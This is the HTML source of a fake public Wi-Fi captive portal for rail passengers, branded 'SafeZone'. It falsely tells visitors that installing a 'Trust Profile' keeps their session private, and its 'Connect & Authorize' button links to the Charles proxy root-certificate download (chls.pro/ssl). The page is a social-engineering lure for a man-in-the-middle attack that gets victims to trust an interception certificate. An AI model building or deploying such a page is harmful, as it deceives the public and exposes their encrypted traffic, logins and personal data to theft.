<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>SafeZone | High-Speed Rail Wi-Fi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, sans-serif;
        }

        body {
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)),
                url('https://images.unsplash.com/photo-1474487548417-781cb71495f3?auto=format&fit=crop&w=1200&q=80');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            max-width: 400px;
            width: 90%;
            text-align: center;
            backdrop-filter: blur(10px);
        }

        .logo-area {
            margin-bottom: 20px;
        }

        .logo-text {
            color: #d32f2f;
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -1px;
        }

        h1 {
            font-size: 22px;
            color: #1a1a1a;
            margin-bottom: 12px;
        }

        p {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .btn {
            display: block;
            background: #d32f2f;
            color: white;
            padding: 16px;
            text-decoration: none;
            border-radius: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
        }

        .btn:hover {
            background: #b71c1c;
            transform: translateY(-2px);
        }

        .footer-text {
            font-size: 11px;
            color: #999;
            margin-top: 25px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .status-dot {
            height: 8px;
            width: 8px;
            background: #4caf50;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-area">
            <span class="logo-text">ðŸš‰ SafeZone</span>
        </div>
        <h1>High-Speed Public Wi-Fi</h1>
        <p>To access the encrypted 5G network, please install the <b>SafeZone Trust Profile</b>. This ensures your
            session remains private on this open platform.</p>

        <a href="http://chls.pro/ssl" class="btn" onclick="this.innerHTML='Connecting...';">
            Connect & Authorize
        </a>

        <div class="footer-text">
            <span class="status-dot"></span> Network Status: Secured by SafeZone-Guard
        </div>
    </div>
</body>

</html>
